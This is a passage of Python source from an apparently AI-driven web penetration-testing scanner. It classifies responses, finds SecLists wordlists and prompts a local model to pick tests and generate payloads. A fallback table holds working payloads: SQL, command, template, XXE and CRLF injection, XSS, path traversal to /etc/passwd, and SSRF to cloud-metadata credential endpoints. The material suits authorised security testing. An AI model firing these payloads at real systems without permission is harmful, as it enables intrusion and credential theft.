            f"{url}|{ct}|{body_hash}".encode("utf-8", errors="ignore")
        ).hexdigest()
        with cls._lock:
            cached = cls._cache.get(cache_key)
        if cached:
            return copy.deepcopy(cached)

        path = urllib.parse.urlparse(str(url or "")).path.lower()
        body_l = body[:6000].lower()
        verdict = "unknown"
        reason = "No strong classification signal."
        title_match = re.search(r"<title[^>]*>(.*?)</title>", body, re.I | re.S)
        title = title_match.group(1).strip()[:120] if title_match else ""

        if cls.is_static_asset_url(url) or ct.startswith(("image/", "font/", "audio/", "video/")):
            verdict = "static_asset"
            reason = "Static URL pattern or static content-type."
        elif cls._looks_like_javascript(body_l, ct) or cls._looks_like_css(body_l, ct):
            verdict = "static_asset"
            reason = "Body signature matches JavaScript/CSS asset."
        elif status in (401, 403):
            verdict = "protected_content"
            reason = "Explicit authorization status."
        elif cls._looks_like_html(body_l, ct):
            login_markers = [
                'type="password"', "name=\"password\"", "autocomplete=\"current-password\"",
                "sign in", "login", "log in", "forgot password", "remember me",
            ]
            if sum(1 for marker in login_markers if marker in body_l) >= 2:
                verdict = "login_page"
                reason = "HTML contains multiple login form markers."
            else:
                protected_markers = [
                    "admin panel", "dashboard", "manage users", "user list",
                    "account settings", "billing", "invoice", "permissions", "roles",
                    "api keys", "secret key", "configuration", "internal only",
                ]
                public_markers = [
                    "<nav", "<footer", "og:", "twitter:", "telegram", "facebook",
                    "instagram", "youtube", "__next", "_next/static", "hero",
                    "copyright", "contact", "admission", "program", "apply now",
                ]
                protected_score = sum(1 for marker in protected_markers if marker in body_l)
                public_score = sum(1 for marker in public_markers if marker in body_l)
                if protected_score >= 2 and protected_score > public_score:
                    verdict = "protected_content"
                    reason = "HTML contains protected/admin content markers."
                elif public_score >= 2 or path in {"", "/", "/en", "/uz", "/ru"}:
                    verdict = "public_page"
                    reason = "HTML looks like a public landing/content page."
        elif cls._looks_like_json(body, ct):
            protected_json_markers = [
                '"email"', '"user_id"', '"account_id"', '"role"', '"permissions"',
                '"balance"', '"orders"', '"users"', '"token"', '"api_key"',
            ]
            if RiskScorer.has_strong_sensitive_candidate(RiskScorer.score_body(body, url=url, headers=headers)):
                verdict = "protected_content"
                reason = "JSON contains strong secret-like material."
            elif any(marker in body_l for marker in protected_json_markers):
                verdict = "data_response"
                reason = "JSON response contains structured account/data fields."
            else:
                verdict = "data_response"
                reason = "Structured JSON/API response."

        result = {
            "verdict": verdict,
            "reason": reason,
            "content_type": ct or "unknown",
            "status": int(status or 0),
            "body_hash": body_hash,
            "title": title,
            "url": url,
        }
        with cls._lock:
            cls._cache[cache_key] = copy.deepcopy(result)
        return result


# ─────────────────────────────────────────────────────────────────────────────
# WORDLIST SCANNER — singleton catalog
# ─────────────────────────────────────────────────────────────────────────────
class WordlistScanner:
    """
    FIX v8.1:
    1. Kali Linux standart yo'llari qo'shildi
    2. Optimal o'lcham bo'yicha sort
    3. max_size_mb bilan tezroq tanlash
    4. Topilmasa aniq xatolik xabari
    """
    SEARCH_ROOTS = [
        Path("/usr/share/seclists"),
        Path("/usr/share/wordlists"),
        Path("/usr/share/wordlists/seclists"),
        Path("/usr/share/wfuzz/wordlist"),
        Path("/usr/share/dirb/wordlists"),
        Path("/usr/share/dirbuster"),
        Path("/opt/seclists"),
        Path("/usr/share/wordlists/dirb"),
        Path("/usr/share/wordlists/dirbuster"),
        Path.home() / "wordlists",
        Path.home() / "SecLists",
    ]
    CATEGORY_KEYWORDS = {
        "lfi":       ["lfi-jhaddix","lfi-suite","lfi_","traversal","path-traversal","lfi"],
        "sqli":      ["sql-injection","sqli","sql_injection","mysql","mssql","oracle","postgres"],
        "xss":       ["xss","cross-site","html-injection"],
        "ssti":      ["ssti","template-injection"],
        "ssrf":      ["ssrf","server-side-request"],
        "cmdi":      ["command-injection","cmdi","cmd-injection","os-injection","rce"],
        "dirs":      ["directory-list-2.3-medium","directory-list-2.3-small",
                      "raft-medium-directories","raft-small-directories",
                      "common","big","directory-list"],
        "params":    ["burp-parameter-names","parameter-names","api-endpoints","param"],
        "passwords": ["rockyou","top-100","top-1000","fasttrack","common-credentials"],
        "api":       ["api-endpoints","graphql","rest"],
        "backup":    ["backup","sensitive-files","config-files"],
    }
    OPTIMAL_SIZES = {
        "dirs":      (80_000,  3_000_000),
        "params":    (30_000,  2_000_000),
        "lfi":       (1_000,   500_000),
        "sqli":      (1_000,   500_000),
        "xss":       (1_000,   300_000),
        "ssti":      (100,     100_000),
        "ssrf":      (100,     200_000),
        "cmdi":      (100,     200_000),
        "passwords": (10_000,  15_000_000),
        "api":       (1_000,   1_000_000),
        "backup":    (1_000,   500_000),
    }
    KALI_FALLBACK = {
        "dirs": [
            "/usr/share/wordlists/dirb/common.txt",
            "/usr/share/dirb/wordlists/common.txt",
            "/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt",
            "/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt",
            "/usr/share/dirbuster/directory-list-2.3-medium.txt",
            "/usr/share/dirbuster/directory-list-2.3-small.txt",
        ],
        "passwords": [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/fasttrack.txt",
        ],
        "lfi": [
            "/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt",
            "/usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt",
        ],
        "sqli": [
            "/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt",
            "/usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt",
        ],
        "xss": [
            "/usr/share/seclists/Fuzzing/XSS/XSS-Jhaddix.txt",
        ],
    }
    _catalog:  dict = {}
    _scanned:  bool = False
    _lock = threading.Lock()

    @classmethod
    def get_catalog(cls) -> dict:
        with cls._lock:
            if cls._scanned:
                return cls._catalog
            cls._catalog = {cat: [] for cat in cls.CATEGORY_KEYWORDS}
            for root in cls.SEARCH_ROOTS:
                if not root.exists():
                    continue
                try:
                    for fp in root.rglob("*.txt"):
                        n = fp.name.lower()
                        p = str(fp).lower()
                        for cat, kws in cls.CATEGORY_KEYWORDS.items():
                            if any(k in n or k in p for k in kws):
                                try:
                                    sz = fp.stat().st_size
                                    if sz > 0:
                                        cls._catalog[cat].append(str(fp))
                                except Exception:
                                    pass
                                break
                except (PermissionError, OSError):
                    pass

            for cat, paths in cls.KALI_FALLBACK.items():
                cls._catalog.setdefault(cat, [])
                for p in paths:
                    if Path(p).exists() and p not in cls._catalog[cat]:
                        try:
                            if Path(p).stat().st_size > 0:
                                cls._catalog[cat].append(p)
                        except Exception:
                            pass

            for cat in cls._catalog:
                opt_min, opt_max = cls.OPTIMAL_SIZES.get(cat, (0, float("inf")))

                def _sort_key(path, _min=opt_min, _max=opt_max):
                    try:
                        sz = Path(path).stat().st_size
                    except Exception:
                        return (3, 0)
                    if _min <= sz <= _max:
                        return (0, -sz)
                    if sz > _max:
                        return (1, sz)
                    return (2, sz)

                cls._catalog[cat] = sorted(set(cls._catalog[cat]), key=_sort_key)

            cls._scanned = True
            total = sum(len(v) for v in cls._catalog.values())
            have = [c for c, v in cls._catalog.items() if v]
            console.print(f"[dim]  WordlistScanner: {total} wordlist(s) in {len(have)} categories[/dim]")
            if not have:
                console.print("[yellow]  Wordlist topilmadi! Kali'da: sudo apt install seclists[/yellow]")
        return cls._catalog

    @classmethod
    def best(cls, category: str, max_size_mb: float = 4.0) -> Optional[str]:
        max_bytes = int(max_size_mb * 1024 * 1024)
        all_paths = cls.get_catalog().get(category, [])
        for p in all_paths:
            if not Path(p).exists():
                continue
            try:
                sz = Path(p).stat().st_size
                if 0 < sz <= max_bytes:
                    console.print(f"  [dim]  Wordlist [{category}]: {Path(p).name} ({sz // 1024}KB)[/dim]")
                    return p
            except Exception:
                continue
        for p in all_paths:
            if Path(p).exists():
                try:
                    sz = Path(p).stat().st_size
                    if sz > 0:
                        console.print(
                            f"  [dim yellow]  Wordlist [{category}]: {Path(p).name} "
                            f"({sz // 1024}KB, oversized)[/dim yellow]"
                        )
                        return p
                except Exception:
                    continue
        console.print(f"  [dim red]  Wordlist [{category}]: topilmadi! sudo apt install seclists[/dim red]")
        return None

    @classmethod
    def summary(cls) -> dict:
        return {k: len(v) for k, v in cls.get_catalog().items()}


# ─────────────────────────────────────────────────────────────────────────────
# AI ENGINE — True Agentic with Dynamic Payload Generation
# ─────────────────────────────────────────────────────────────────────────────
SYSTEM_PROMPT = """You are an elite black-box web application penetration tester AI.
Your job is to find REAL vulnerabilities — not false positives.

CORE RULES:
1. Always respond in strict JSON. No markdown outside JSON.
2. A status 500 alone is NOT a vulnerability — need concrete evidence in body.
3. Only report findings with ACTUAL exploitation evidence.
4. Generate payloads based on the TECHNOLOGY STACK, not hardcoded lists.
5. After each test, decide the NEXT best action based on results.
"""

class AIEngine:
    VALID_RISKS = {"Critical","High","Medium","Low","Info"}
    VALID_OWASP = {f"A{i:02d}" for i in range(1,11)}
    SUPPORTED_AGENTIC_ACTIONS = {
        "stop",
        "test_sqli", "test_xss", "test_lfi", "test_ssti", "test_ssrf",
        "test_cmdi", "test_idor", "test_auth", "test_header",
        "fuzz_params", "test_nosqli", "test_stored_xss",
        "test_second_order_sqli", "test_mass_assign", "test_open_redirect",
        "test_crlf", "test_prototype", "test_graphql",
    }

    def __init__(self):
        self._cache:         dict = {}
        self._page_analysis_cache: dict = {}
        self._dir_hit_verdict_cache: dict = {}
        self._sensitive_verdict_cache: dict = {}
        self._access_verdict_cache: dict = {}
        self._client              = None
        self._lock                = threading.Lock()
        self._call_count:   int   = 0
        self._error_count:  int   = 0

    def _get_client(self):
        if self._client is None:
            self._client = _ollama.Client(host=OLLAMA_HOST)
        resolve_model_name(MODEL_NAME)
        return self._client

    @staticmethod
    def _clean(text: str, max_chars: int = 2000) -> str:
        return re.sub(r'[\x00-\x08\x0b\x0c\x0e-\x1f]', '', text[:max_chars])

    def _chat_text(
        self,
        messages: List[dict],
        timeout_sec: Optional[float] = None,
        model_override: Optional[str] = None,
        options: Optional[dict] = None,
    ) -> str:
        """
        Send chat request to Ollama HTTP API with real timeout enforcement.
        """
        model = resolve_model_name(model_override or MODEL_NAME)
        timeout = float(timeout_sec if timeout_sec and timeout_sec > 0 else AI_CALL_TIMEOUT_SEC)
        chat_url = urllib.parse.urljoin(OLLAMA_HOST.rstrip("/") + "/", "api/chat")
        payload = {
            "model": model,
            "messages": messages,
            "stream": False,
        }
        if options:
            payload["options"] = dict(options)
        req = urllib.request.Request(
            chat_url,
            data=json.dumps(payload).encode("utf-8"),
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                raw = resp.read().decode("utf-8", errors="replace")
        except urllib.error.HTTPError as e:
            err_body = ""
            try:
                err_body = e.read().decode("utf-8", errors="replace")[:220]
            except Exception:
                pass
            if int(getattr(e, "code", 0) or 0) == 429:
                raise RuntimeError(f"429 Too Many Requests for url: {chat_url}")
            raise RuntimeError(f"Ollama HTTP {getattr(e, 'code', '?')}: {err_body or str(e)}")
        except Exception as e:
            emsg = str(e).lower()
            if "timeout" in emsg or "timed out" in emsg:
                raise TimeoutError(f"AI timeout after {timeout:.1f}s")
            raise

        resp = json.loads(raw)
        msg = resp.get("message", {}).get("content")
        if not isinstance(msg, str):
            raise ValueError("Invalid Ollama response format")
        return msg

    @staticmethod
    def _extract_json_payload(text: str, expect_list: bool = False) -> Optional[Any]:
        """
        Extract first valid JSON object/array from model output.
        Handles extra prose before/after JSON blocks.
        """
        if not text:
            return None
        clean = re.sub(r'```json|```', '', str(text), flags=re.IGNORECASE).strip()
        decoder = json.JSONDecoder()
        expected_starts = "[" if expect_list else "{["

        for idx, ch in enumerate(clean):
            if ch not in expected_starts:
                continue
            try:
                parsed, _ = decoder.raw_decode(clean[idx:])
            except Exception:
                continue
            if expect_list and isinstance(parsed, list):
                return parsed
            if not expect_list and isinstance(parsed, dict):
                return parsed
        return None

    def _validate(self, r: dict) -> dict:
        if not isinstance(r, dict): return {}
        if "confidence" in r:
            try:    r["confidence"] = max(0, min(100, int(r["confidence"])))
            except: r["confidence"] = 0
        if "risk" in r and r["risk"] not in self.VALID_RISKS:
            r["risk"] = "Medium"
        if "owasp_id" in r and r["owasp_id"] not in self.VALID_OWASP:
            r["owasp_id"] = "A05"
        for key in ("title","evidence","reason","remediation","exploit_cmd"):
            if key in r and isinstance(r[key], str):
                r[key] = r[key][:500]
        return r

    def _call(self, prompt: str, cache: bool = True,
              expect_list: bool = False, timeout_sec: Optional[float] = None,
              retries: int = 3) -> Optional[Any]:
        if not HAS_OLLAMA:
            return None
        key = hashlib.md5(prompt.encode()).hexdigest()
        if cache and key in self._cache:
            return self._cache[key]

        last_err = None
        retries = max(1, int(retries))
        for attempt in range(retries):
            try:
                # Single-flight AI access: prevents parallel bursts that trigger Ollama 429.
                with self._lock:
                    raw = self._chat_text(
                        messages=[
                            {"role": "system", "content": SYSTEM_PROMPT},
                            {"role": "user",   "content": prompt},
                        ],
                        timeout_sec=timeout_sec,
                    )
                parsed = self._extract_json_payload(raw, expect_list=expect_list)
                if parsed is not None:
                    if expect_list:
                        if cache:
                            self._cache[key] = parsed
                        self._call_count += 1
                        self._error_count = 0
                        return parsed
                    result = self._validate(parsed)
                    if cache:
                        self._cache[key] = result
                    self._call_count += 1
                    self._error_count = 0
                    return result
                raise ValueError("AI returned no valid JSON payload")
            except Exception as e:
                last_err = e
                self._error_count += 1
                emsg = str(e).lower()
                if ("429" in emsg or "too many requests" in emsg):
                    if attempt < (retries - 1):
                        self._client = None
                        time.sleep(min(1.0 * (attempt + 1), 3.0))
                        continue
                    console.print("[dim yellow]  AI busy (429), skipped this AI check and continued.[/dim yellow]")
                    return None
                if ("500" in emsg or "timeout" in emsg or "timed out" in emsg) and attempt < (retries - 1):
                    self._client = None
                    time.sleep(min(1.0 * (attempt + 1), 3.0))
                    continue
                if attempt < (retries - 1):
                    time.sleep(min(0.5 * (attempt + 1), 1.5))
                    continue
                break
        if last_err:
            console.print(f"[dim red]  AI error: {str(last_err)}[/dim red]")
        return None

    def _call_required(self, prompt: str, *, purpose: str,
                       cache: bool = True, expect_list: bool = False,
                       timeout_sec: Optional[float] = None,
                       retries: int = 4) -> Any:
        result = self._call(
            prompt,
            cache=cache,
            expect_list=expect_list,
            timeout_sec=timeout_sec,
            retries=retries,
        )
        if result is None:
            model = active_model_name() or MODEL_NAME
            raise AIRequiredError(
                f"AI required for {purpose}, but model '{model}' did not recover after retry."
            )
        return result

    # ── Dynamic Payload Generation ────────────────────────────────────────────
    def generate_payloads(self, vuln_type: str, context: dict) -> List[str]:
        """
        CORE NEW FEATURE: AI generates payloads based on tech stack.
        No more hardcoded lists.
        """
        tech   = context.get("tech", {})
        url    = context.get("url", "")
        param  = context.get("param", "")
        sample = context.get("response_sample", "")

        prompt = f"""Generate 8 targeted {vuln_type} payloads for this specific target.

TARGET INFO:
  URL: {url}
  Parameter: {param}
  Technology: lang={tech.get('lang','?')} server={tech.get('server','?')} framework={tech.get('framework','?')} cms={tech.get('cms','?')}
  Response sample: {self._clean(sample, 400)}

PAYLOAD RULES:
- For PHP/Laravel: use PHP-specific paths (../../../etc/passwd, <?php...>)
- For Java/Spring: target actuator endpoints, Java deserialization
- For Python/Django: use Python SSTI ({{{{7*7}}}})
- For Node.js: use prototype pollution, Node.js-specific injections
- For unknown tech: use generic payloads

Return JSON: {{"payloads": ["payload1", "payload2", ...], "reasoning": "why these"}}"""
        result = self._call(prompt, cache=False)
        if result and result.get("payloads"):
            return result["payloads"][:10]

        # Fallback to static list
        return self._static_payloads(vuln_type)

    def _static_payloads(self, vuln_type: str) -> List[str]:
        """Static fallback payloads when AI is unavailable."""
        return {
            "sqli": [
                "'", "''", "1'--", "1 OR 1=1--", "' OR '1'='1",
                "1; SELECT SLEEP(3)--", "1' AND SLEEP(3)--",
                "' UNION SELECT NULL,NULL,NULL--", "1 AND 1=2",
                "'; WAITFOR DELAY '0:0:3'--", "1' AND 1=1--", "admin'--",
            ],
            "xss": [
                "<script>alert(1)</script>",
                '"><script>alert(1)</script>',
                '"><img src=x onerror=alert(1)>',
                "<svg onload=alert(1)>",
                "javascript:alert(1)",
                "'><script>alert(1)</script>",
                "<script>alert(document.domain)</script>",
            ],
            "lfi": [
                "../../../../etc/passwd",
                "../../etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd",
                "....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252F..%252Fetc%252Fpasswd",
                "../../../../windows/win.ini",
                "/etc/passwd",
            ],
            "ssti": [
                "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>",
                "{{config}}", "{{self.__dict__}}", "{% debug %}",
                "{{request.environ}}", "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
            ],
            "ssrf": [
                "http://127.0.0.1/",
                "http://localhost/",
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/user-data",
                "http://localhost:8080/",
                "file:///etc/passwd",
                "dict://127.0.0.1:6379/info",
                "gopher://127.0.0.1:9200/_cat/indices",
            ],
            "cmdi": [
                "; id", "| id", "$(id)", "; sleep 5",
                "| sleep 5", "$(sleep 5)", "; cat /etc/passwd",
                "| cat /etc/passwd", "|| id", "; whoami", "\nid\n",
                "`id`",
            ],
            "xxe": [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
            ],
            "idor":  ["0", "1", "2", "-1", "999999", "admin", "null"],
            "nosqli": [
                '{"$gt":""}', '{"$ne":null}', '{"$where":"sleep(3)"}',
                '{"$regex":".*"}', '{"$exists":true}', '[{"$gt":""}]',
                '{"$gt":0}', '{"$nin":[]}', '{"$or":[{"a":"b"}]}',
            ],
            "prototype": [
                "__proto__[admin]=true",
                "__proto__[role]=admin",
                "constructor[prototype][admin]=true",
                '{"__proto__":{"admin":true}}',
                '{"constructor":{"prototype":{"admin":true}}}',
                "__proto__[isAdmin]=1",
            ],
            "crlf": [
                "%0d%0aSet-Cookie:%20evil=1",
                "%0aSet-Cookie:%20evil=1",
                "%0d%0aLocation:%20https://evil.com",
                "%0d%0aContent-Length:%200%0d%0a%0d%0a",
                "foo%0d%0abar%0d%0a",
                "%0d%0aX-Injected:%20header",
            ],
            "ssrf_extended": [
                "http://0x7f000001/",
                "http://[::1]/",
                "http://2130706433/",
                "http://127.1/",
                "http://0177.0.0.1/",
                "http://localhost.evil.com@127.0.0.1/",
                "dict://127.0.0.1:6379/info",
                "gopher://127.0.0.1:9200/_cat/indices",
                "ftp://127.0.0.1:21/",
                "ldap://127.0.0.1:389/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "http://100.100.100.200/latest/meta-data/",
            ],
        }.get(vuln_type, [
            "'",
            '"',
            "<script>alert(1)</script>",
            "{{7*7}}",
            "${7*7}",
            "../../../../etc/passwd",
            "; id",
            "1 OR 1=1",
        ])

    # ── Agentic Decision Making ───────────────────────────────────────────────
    def decide_next_action(self, scan_state: dict,
                           memory: "FailureMemory" = None) -> dict:
        url = scan_state.get("url", "")
        method = scan_state.get("method", "GET")
        params = scan_state.get("params_raw", {})
        tech = scan_state.get("tech", {})
        ep_intel = EndpointIntelligence.analyze(
            url=url,
            params={k: "" for k in params} if isinstance(params, list) else params,
            method=method,
            response_sample=scan_state.get("last_response_snippet", ""),
        )

        lesson_ctx = ""
        if memory:
            lesson_ctx = memory.build_lesson_context(tech=tech, url=url)
        kb_ctx = getattr(self, "_kb_context", "")
        if kb_ctx:
            lesson_ctx = kb_ctx + "\n" + lesson_ctx

        params_formatted = []
        raw_params = scan_state.get("params_raw", {})
        if isinstance(raw_params, dict):
            for k, v in list(raw_params.items())[:15]:
                pname = k.split(":")[-1]
                source = k.split(":")[0] if ":" in k else "unknown"
                semantic = ep_intel["risk_params"].get(pname.lower(), {}).get("semantic", "")
                params_formatted.append(
                    f"  - {k}={str(v)[:20]!r} (source={source}" +
                    (f", semantic={semantic}" if semantic else "") + ")"
                )
        elif isinstance(raw_params, list):
            for k in raw_params[:15]:
                params_formatted.append(f"  - {k}")

        tests_done = scan_state.get("tests_done", [])
        done_actions = set()
        for t in tests_done:
            action = t.split(":")[0] if ":" in t else t
            done_actions.add(action)
        remaining_tests = [
            t for t in ep_intel["priority_tests"]
            if f"test_{t}" not in done_actions and f"mandatory:{t}" not in " ".join(tests_done)
        ]
        response_class = str(scan_state.get("response_class") or "unknown")
        response_reason = str(scan_state.get("response_class_reason") or "")
        response_title = str(scan_state.get("response_title") or "")
        response_sample = str(scan_state.get("response_body_sample") or scan_state.get("last_response_snippet") or "")
        response_sample_clean = self._clean(response_sample, 900)
        response_sample_l = response_sample.lower()
        strong_sensitive = bool(scan_state.get("has_strong_sensitive_candidate"))
        generic_guard_reason = ""

        if not strong_sensitive:
            if response_class in {"static_asset", "public_page"}:
                generic_guard_reason = (
                    f"Response body classified as {response_class}; path name and synthetic headers "
                    f"alone are not evidence of a real candidate."
                )
            elif response_class == "login_page":
                generic_guard_reason = (
                    "Response body is only a login page. No protected/admin/config data is visible."
                )
            elif int(scan_state.get("last_status", 0) or 0) == 0 and not response_sample.strip():
                generic_guard_reason = (
                    "Endpoint returned no usable body / unreachable response. Cannot infer a vulnerability "
                    "or candidate from URL name alone."
                )
            elif response_class == "data_response":
                if any(token in response_sample_l for token in ['"openapi"', '"swagger"', '/components/schemas', '"paths"']):
                    generic_guard_reason = (
                        "Response body looks like API documentation/schema, not protected user/config data."
                    )
            elif response_class == "unknown":
                if not response_sample.strip():
                    generic_guard_reason = "Response body is empty; there is no content evidence to justify more testing."
                elif (("<html" in response_sample_l or "<body" in response_sample_l or "<!doctype html" in response_sample_l) and
                      not any(token in response_sample_l for token in [
                          "root:x:", "aws_", "api_key", "secret_key", "\"users\"", "\"role\"",
                          "\"permissions\"", "\"account_id\"", "\"balance\"", "\"token\"",
                      ])):
                    generic_guard_reason = (
                        "Response body looks like a generic HTML shell/error page with no protected data evidence."
                    )

        if generic_guard_reason:
            return {
                "action": "stop",
                "reason": generic_guard_reason,
                "priority": 0,
                "stop_reason": generic_guard_reason,
            }

        prompt = f"""You are an expert black-box penetration tester making decisions.

CURRENT ENDPOINT:
URL: {url}
Method: {method}
Status: {scan_state.get('last_status', 0)}
Size: {scan_state.get('last_size', 0)} bytes

ENDPOINT ANALYSIS:
Type: {ep_intel['endpoint_type']}
Risk Level: {ep_intel['risk_level']}
Context: {ep_intel['context_hint']}

Parameters:
{chr(10).join(params_formatted) if params_formatted else "  (none found)"}

Parameter Analysis:
{ep_intel['param_analysis']}

Response hints: {', '.join(ep_intel['response_hints']) if ep_intel['response_hints'] else 'none'}
Response class: {response_class}
Response class reason: {response_reason or 'none'}
Response title: {response_title or 'none'}
Strong sensitive evidence present: {strong_sensitive}
Response body sample:
{response_sample_clean or '(empty)'}

Tests already done: {tests_done[-8:] if tests_done else ['none']}
Findings so far: {scan_state.get('findings', [])}
Signals: {scan_state.get('signals', [])[-5:]}
Technology: {tech}
High priority remaining: {remaining_tests}

{lesson_ctx}

DECISION RULES:
1. SEARCH endpoint with q/query/search params:
   Always test_sqli or test_xss first.
   Never choose fuzz_params when params already exist.
2. FILE params:
   Always test_lfi first.
3. URL params:
   Always test_ssrf or test_open_redirect.
4. ID params:
   Always test_idor first, then test_sqli.
5. fuzz_params is only for endpoints with no known params.
6. stop only when all meaningful tests are done.
7. You MUST inspect the response body sample before deciding.
8. Never infer a vulnerability or candidate from URL keywords, status, size, or synthetic headers alone.
9. If the body is empty, generic HTML, public content, login page, static asset, or API docs without protected data, choose stop.
10. Never use phrases like "critical vulnerability discovered" unless the body itself shows real protected/config/secret data.
11. Use only one of these actions: {sorted(self.SUPPORTED_AGENTIC_ACTIONS)}.

Return JSON:
{{
  "action": "test_sqli",
  "param": "exact_param_key_from_parameters",
  "reason": "why this test fits this endpoint type and parameter",
  "priority": 1-10,
  "stop_reason": "only if action=stop"
}}"""
        result = self._call(prompt, cache=False)
        if result:
            action = str(result.get("action") or "stop")
            if action not in self.SUPPORTED_AGENTIC_ACTIONS:
                fallback_reason = (
                    f"Unsupported AI action '{action}' rejected. "
                    f"Body-aware planner only accepts supported actions."
                )
                if remaining_tests:
                    return {
                        "action": f"test_{remaining_tests[0]}",
                        "param": "",
                        "reason": fallback_reason,
                        "priority": 4,
                    }
                return {
                    "action": "stop",
                    "reason": fallback_reason,
                    "priority": 0,
                    "stop_reason": fallback_reason,
                }
            if result.get("action") == "fuzz_params" and params_formatted and remaining_tests:
                best_action = f"test_{remaining_tests[0]}"
                best_param = ""
                for k in (params if isinstance(params, dict) else {}):
                    if not k.startswith("header:") and not k.startswith("cookie:"):
                        best_param = k
                        break
                console.print(
                    f"  [dim yellow]  AI chose fuzz_params but params exist — overriding with {best_action}[/dim yellow]"
                )
                return {
                    "action": best_action,
                    "param": best_param,
                    "reason": f"Auto-override: {ep_intel['endpoint_type']} endpoint needs {remaining_tests[0]} testing",
                    "priority": 9,
                }
            if result.get("action") == "stop":
                stop_reason = str(result.get("stop_reason") or result.get("reason") or "")
                if (not strong_sensitive) and any(token in stop_reason.lower() for token in [
                    "critical vulnerability discovered", "vulnerability discovered", "sensitive config exposed",
                    "credentials exposed", "backup publicly accessible",
                ]):
                    safe_reason = (
                        "Stop accepted, but downgraded reasoning: response body does not contain concrete protected data evidence."
                    )
                    result["reason"] = safe_reason
                    result["stop_reason"] = safe_reason
            return result

        if remaining_tests:
            best_action = f"test_{remaining_tests[0]}"
            best_param = ""
            rp = ep_intel.get("risk_params", {})
            if rp and isinstance(params, dict):
                for k in params:
                    pname = k.split(":")[-1].lower()
                    if pname in rp:
                        best_param = k
                        break
            if not best_param and params:
                p_list = params if isinstance(params, list) else list(params.keys())
                for pk in p_list:
                    if not pk.startswith("header:") and not pk.startswith("cookie:"):
                        best_param = pk
                        break
            return {
                "action": best_action,
                "param": best_param,
                "reason": f"Fallback: {ep_intel['endpoint_type']} -> {remaining_tests[0]}",
                "priority": 7,
            }

        return {"action": "stop", "reason": "AI unavailable, no remaining tests", "priority": 0}

    # ── Vulnerability Classification ──────────────────────────────────────────
    def classify_finding(self, context: dict,
                         memory: "FailureMemory" = None) -> Optional[dict]:
        # FailureMemory: avval FP bo'lgan patternlarni tekshir
        if memory:
            fp_reason = memory.was_false_positive_before(
                owasp_id = context.get("owasp_id",""),
                tool     = context.get("tool",""),
                param    = context.get("param",""),
                payload  = context.get("payload",""),
                tech     = context.get("tech",{}),
                url      = context.get("url",""),
            )
            if fp_reason:
                console.print(
                    f"  [dim]  🧠 Memory skip: previously FP — {fp_reason[:70]}[/dim]"
                )
                return {"found": False, "confidence": 0,
                        "false_positive_reason": f"Memory: {fp_reason}"}

        # Lesson context — AI o'z xatolarini biladi
        lesson_ctx = memory.build_lesson_context(
            tech=context.get("tech",{}), url=context.get("url","")
        ) if memory else ""

        prompt = f"""Classify this fuzz test result. Is it a REAL vulnerability?

URL: {context.get('url')}
Method: {context.get('method')}
Parameter: {context.get('param')}
Payload: {context.get('payload')}
Tool: {context.get('tool')}

BASELINE: status={context.get('baseline_status')}, size={context.get('baseline_size')}, time={context.get('baseline_timing')}s
FUZZED:   status={context.get('fuzz_status')}, size={context.get('fuzz_size')}, time={context.get('fuzz_timing')}s
Size diff: {context.get('size_diff')} bytes ({context.get('size_pct')}%)
Time anomaly: {context.get('time_anomaly')} (diff: {context.get('timing_diff')}s)
New errors: {context.get('new_errors')}

Response snippet:
{self._clean(context.get('body_snippet',''), 600)}

Tool output:
{self._clean(context.get('tool_output',''), 600)}

STRICT FALSE POSITIVE RULES:
1. status 400→500 alone = NOT a vuln (just crashes on bad input)
2. Generic "Internal Server Error" with no injection evidence = FP
3. For CMDi: need actual command output (uid=, hostname, /etc/passwd content) OR time delay >4s
4. For SQLi: need SQL error with table/column names OR time delay >3s OR different data
5. For XSS: payload must be REFLECTED unescaped in response
6. For LFI: file content (root:x:0:0, [extensions]) must appear
7. For SSRF: internal service response or DNS callback must be confirmed
8. Size diff alone (without meaningful content change) = NOT enough
9. Only time delay >3s counts as blind injection evidence (with baseline <1s)

{lesson_ctx}

Return JSON: {{
  "found": true/false,
  "owasp_id": "A01-A10",
  "owasp_name": "...",
  "title": "...",
  "risk": "Critical|High|Medium|Low",
  "confidence": 0-100,
  "evidence": "SPECIFIC evidence from response body — quote actual text",
  "exploit_cmd": "curl command to reproduce",
  "remediation": "how to fix",
  "false_positive_reason": "if FP, specific reason"
}}"""
        return self._call(prompt, cache=False)

    # ── Page Analysis ─────────────────────────────────────────────────────────
    def analyze_page(self, url: str, status: int, body: str,
                     headers: dict, is_200: dict) -> dict:
        title = re.search(r'<title[^>]*>(.*?)</title>', body, re.I|re.S)
        title = title.group(1).strip() if title else ""
        sens  = RiskScorer.score_body(body)
        norm_body = re.sub(r"\d{2,}", "#", (body or "").lower())
        norm_body = re.sub(r"\s+", " ", norm_body).strip()
        cache_key = hashlib.md5(
            json.dumps({
                "status": int(status or 0),
                "title": title.lower(),
                "content_type": str((headers or {}).get("Content-Type", "")).lower(),
                "body_hash": hashlib.md5(norm_body[:1800].encode("utf-8", errors="replace")).hexdigest(),
            }, sort_keys=True).encode("utf-8", errors="replace")
        ).hexdigest()
        cached = self._page_analysis_cache.get(cache_key)
        if cached is not None:
            return copy.deepcopy(cached)

        preview_chars = min(PAGE_ANALYSIS_BODY_CHARS, 700)
